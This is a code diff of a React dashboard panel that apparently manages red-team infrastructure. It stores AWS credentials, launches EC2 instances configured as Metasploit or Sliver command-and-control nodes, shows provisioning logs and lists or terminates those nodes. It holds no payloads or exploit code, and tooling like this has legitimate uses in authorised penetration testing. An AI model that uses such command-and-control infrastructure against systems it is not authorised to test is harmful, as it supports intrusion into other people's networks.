+                <div style={{ marginLeft: 'auto', display: 'flex', gap: 8 }}>
+                  <button onClick={() => setCloudSettingsOpen(o => !o)} className="btn btn-sm btn-ghost" style={{ fontSize: 10 }}>AWS Settings</button>
+                  <button onClick={() => setLaunchFormOpen(o => !o)} className="btn btn-sm" style={{ fontSize: 10, color: '#a78bfa', borderColor: 'rgba(167,139,250,0.4)' }}>
+                    <Icon name="plus" size={11} /> Launch EC2 Node
+                  </button>
+                </div>
+              </div>
+
+              {cloudSettingsOpen && (
+                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(167,139,250,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 180px', gap: 10 }}>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>ACCESS KEY ID</label>
+                      <input type="password" value={awsAccessKey} onChange={e => setAwsAccessKey(e.target.value)} placeholder="AKIAIOSFODNN7EXAMPLE" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>SECRET ACCESS KEY</label>
+                      <input type="password" value={awsSecretKey} onChange={e => setAwsSecretKey(e.target.value)} placeholder="wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>REGION</label>
+                      <select value={awsRegion} onChange={e => setAwsRegion(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
+                        {['us-east-1','us-east-2','us-west-1','us-west-2','eu-west-1','eu-west-2','eu-central-1','ap-southeast-1','ap-southeast-2','ap-northeast-1','sa-east-1','ca-central-1'].map(r => <option key={r} value={r}>{r}</option>)}
+                      </select>
+                    </div>
+                  </div>
+                  <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
+                    <button onClick={handleSaveCloudCreds} disabled={savingCloudCreds || !awsAccessKey || !awsSecretKey} className="btn btn-sm">{savingCloudCreds ? 'Saving…' : 'Save & Verify'}</button>
+                    {cloudStatus && (
+                      <span style={{ fontSize: 11, fontFamily: 'var(--font-mono)', color: cloudStatus.valid ? 'var(--ok)' : 'var(--crit)' }}>
+                        {cloudStatus.valid ? `Account: ${cloudStatus.account_id}` : cloudStatus.error ?? 'Invalid credentials'}
+                      </span>
+                    )}
+                  </div>
+                </div>
+              )}
+
+              {launchFormOpen && (
+                <div style={{ padding: 16, borderBottom: rule, background: 'rgba(167,139,250,0.03)', display: 'flex', flexDirection: 'column', gap: 12 }}>
+                  <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr 1fr 1fr', gap: 10 }}>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>NODE NAME</label>
+                      <input value={launchName} onChange={e => setLaunchName(e.target.value)} placeholder="c2-node-1" style={{ width: '100%', padding: '6px 10px', fontSize: 12 }} />
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>C2 TYPE</label>
+                      <select value={launchC2Type} onChange={e => setLaunchC2Type(e.target.value as 'msf' | 'sliver')} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
+                        <option value="msf">Metasploit</option>
+                        <option value="sliver">Sliver</option>
+                      </select>
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>REGION</label>
+                      <select value={launchRegion} onChange={e => setLaunchRegion(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
+                        {['us-east-1','us-east-2','us-west-1','us-west-2','eu-west-1','eu-west-2','eu-central-1','ap-southeast-1','ap-southeast-2','ap-northeast-1'].map(r => <option key={r} value={r}>{r}</option>)}
+                      </select>
+                    </div>
+                    <div>
+                      <label style={{ fontSize: 10, color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', display: 'block', marginBottom: 4 }}>INSTANCE TYPE</label>
+                      <select value={launchInstanceType} onChange={e => setLaunchInstanceType(e.target.value)} style={{ width: '100%', padding: '6px 10px', fontSize: 12, background: 'var(--bg)', border: rule, color: 'var(--fg)' }}>
+                        <option value="t3.micro">t3.micro (free tier)</option>
+                        <option value="t3.small">t3.small</option>
+                        <option value="t3.medium">t3.medium (Recommended)</option>
+                        <option value="t3.large">t3.large</option>
+                        <option value="c5.xlarge">c5.xlarge</option>
+                      </select>
+                    </div>
+                  </div>
+                  <div style={{ display: 'flex', gap: 8 }}>
+                    <button onClick={handleLaunchEC2} disabled={launchingInstance || !launchName} className="btn btn-sm" style={{ color: '#a78bfa', borderColor: 'rgba(167,139,250,0.4)' }}>
+                      {launchingInstance ? 'Launching…' : 'Launch EC2 Instance'}
+                    </button>
+                    <button onClick={() => setLaunchFormOpen(false)} className="btn btn-sm btn-ghost">Cancel</button>
+                  </div>
+                </div>
+              )}
+
+              {provisionLog.length > 0 && (
+                <div style={{ borderBottom: rule }}>
+                  <div style={{ padding: '8px 16px', borderBottom: rule, background: 'rgba(0,0,0,0.2)', display: 'flex', alignItems: 'center', gap: 8 }}>
+                    <span style={{ fontSize: 10, color: 'var(--accent)', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.1em' }}>
+                      {provisionInstanceId ? `Provisioning ${provisionInstanceId}` : 'Provision Log'}
+                    </span>
+                    <button onClick={() => setProvisionLog([])} style={{ background: 'none', border: 'none', cursor: 'pointer', color: 'var(--fg-4)', marginLeft: 'auto', padding: 0 }}>
+                      <Icon name="x" size={12} />
+                    </button>
+                  </div>
+                  <div ref={provisionLogRef} style={{ fontFamily: 'var(--font-mono)', fontSize: 11, color: 'var(--fg-2)', padding: 12, maxHeight: 200, overflowY: 'auto', background: 'var(--bg)', lineHeight: 1.6 }}>
+                    {provisionLog.map((line, i) => <div key={i}>{line}</div>)}
+                  </div>
+                </div>
+              )}
+
+              {cloudInstances.length === 0 ? (
+                <div style={{ padding: '32px 16px', textAlign: 'center', color: 'var(--fg-3)', fontFamily: 'var(--font-mono)', fontSize: 11 }}>No cloud instances. Configure AWS credentials and launch an EC2 node above.</div>
+              ) : (
+                <table className="data">
+                  <thead>
+                    <tr>
+                      <th>Name</th>
+                      <th style={{ width: 80 }}>C2 Type</th>
+                      <th style={{ width: 130 }}>Instance ID</th>
+                      <th style={{ width: 120 }}>Public IP</th>
+                      <th style={{ width: 80 }}>Region</th>
+                      <th style={{ width: 100 }}>Status</th>
+                      <th style={{ width: 60 }}></th>
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {cloudInstances.map(inst => {
+                      const statusColor = inst.status === 'ready' ? 'var(--ok)' : inst.status === 'error' ? 'var(--crit)' : inst.status === 'running' || inst.status === 'configuring' ? 'var(--accent)' : 'var(--fg-3)'
+                      return (
+                        <tr key={inst.id}>
+                          <td style={{ fontWeight: 500, fontSize: 12 }}>{inst.name}</td>
+                          <td>
+                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: inst.c2_type === 'msf' ? 'var(--accent)' : '#a78bfa' }}>{inst.c2_type}</span>
+                          </td>
+                          <td className="mono" style={{ fontSize: 10, color: 'var(--fg-3)' }}>{inst.instance_id || '—'}</td>
+                          <td className="mono" style={{ fontSize: 11 }}>{inst.public_ip ?? '—'}</td>
+                          <td className="mono" style={{ fontSize: 10, color: 'var(--fg-3)' }}>{inst.region}</td>
+                          <td>
+                            <span style={{ fontSize: 10, padding: '2px 7px', fontFamily: 'var(--font-mono)', textTransform: 'uppercase', letterSpacing: '0.06em', color: statusColor }}>{inst.status}</span>
+                          </td>
+                          <td>
+                            <button
+                              onClick={() => fetch(`${getApiBase()}/cloud/instances/${inst.id}`, { method: 'DELETE' }).then(() => loadCloudInstances())}
+                              className="btn btn-sm btn-ghost"
+                              style={{ fontSize: 10, color: 'var(--crit)' }}
+                              title="Terminate instance"
+                            >Term</button>
+                          </td>
+                        </tr>
+                      )
+                    })}
+                  </tbody>
+                </table>
+              )}
+            </div>
+
           </div>
         )}
 
